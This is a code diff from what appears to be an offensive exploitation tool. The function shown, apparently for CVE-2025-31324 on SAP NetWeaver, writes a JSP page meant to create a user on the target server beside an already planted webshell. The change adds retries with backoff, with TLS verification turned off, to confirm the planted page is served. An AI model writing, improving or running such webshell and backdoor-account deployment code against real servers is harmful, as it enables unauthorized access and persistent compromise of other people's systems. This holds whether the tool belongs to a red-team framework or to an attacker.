@@ -613,27 +613,53 @@ def deploy_create_user_jsp_via_cve_31324(node, writer_fn) -> dict:
           f"chunks")
 
     # --- Step 4: GET-probe to confirm the JSP is actually served ---
+    # Retry with backoff: Tomcat / Jasper compiles JSPs lazily on first
+    # request, and the page-cache view of the freshly-written file can
+    # lag the disk write by a second or two.  An immediate probe right
+    # after the chunked write therefore frequently sees HTTP 404 even
+    # though the webshell sibling in the same directory is serving.
+    # 6 attempts at 0, 1, 2, 3, 5, 8 s = ~19 s budget total.
+    import time as _time
     scheme = "https" if getattr(node, "cve_2025_31324_https", False) else "http"
     host = node.ip or node.hostname
     jsp_url = f"{scheme}://{host}:{port}/irj/{jsp_name}"
 
-    try:
-        ctx = ssl._create_unverified_context()
-        req = urllib.request.Request(jsp_url, headers={"User-Agent": _UA})
-        with urllib.request.urlopen(req, timeout=10, context=ctx) as pr:
-            probe_status = pr.status
-    except urllib.error.HTTPError as e:
-        probe_status = e.code
-    except (urllib.error.URLError, TimeoutError, OSError) as e:
-        return {"success": False,
-                "error": (f"JSP written to {target_path} but probe failed: "
-                          f"{e}"),
-                "jsp_url": jsp_url, "target_path": target_path}
+    probe_status = 0
+    last_err = ""
+    delays = (0, 1, 2, 3, 5, 8)
+    for attempt, delay in enumerate(delays, 1):
+        if delay:
+            _time.sleep(delay)
+        try:
+            ctx = ssl._create_unverified_context()
+            req = urllib.request.Request(jsp_url,
+                                          headers={"User-Agent": _UA})
+            with urllib.request.urlopen(req, timeout=10, context=ctx) as pr:
+                probe_status = pr.status
+        except urllib.error.HTTPError as e:
+            probe_status = e.code
+        except (urllib.error.URLError, TimeoutError, OSError) as e:
+            probe_status = 0
+            last_err = str(e)
+        if probe_status == 200:
+            if attempt > 1:
+                print(f"[*] {sid}: JSP became reachable on attempt {attempt} "
+                      f"({sum(delays[:attempt])}s after write)")
+            break
+        # On 404 specifically, the file is there but Jasper hasn't picked
+        # it up yet — keep retrying.  On other statuses (5xx etc.) we
+        # also retry because they're typically transient too.
+        print(f"[*] {sid}: probe attempt {attempt}/{len(delays)} → "
+              f"HTTP {probe_status or 'error'}{(' ('+last_err+')') if last_err else ''}; "
+              f"{'compilation may still be pending' if probe_status == 404 else 'will retry'}")
 
     if probe_status != 200:
+        suffix = f"HTTP {probe_status}" if probe_status else f"probe error: {last_err}"
         return {"success": False,
                 "error": (f"JSP written to {target_path} but GET {jsp_url} "
-                          f"returned HTTP {probe_status}"),
+                          f"never reached HTTP 200 after "
+                          f"{sum(delays)}s of retries — last status: "
+                          f"{suffix}"),
                 "jsp_url": jsp_url, "target_path": target_path}
 
     return {"success": True, "jsp_url": jsp_url, "jsp_name": jsp_name,
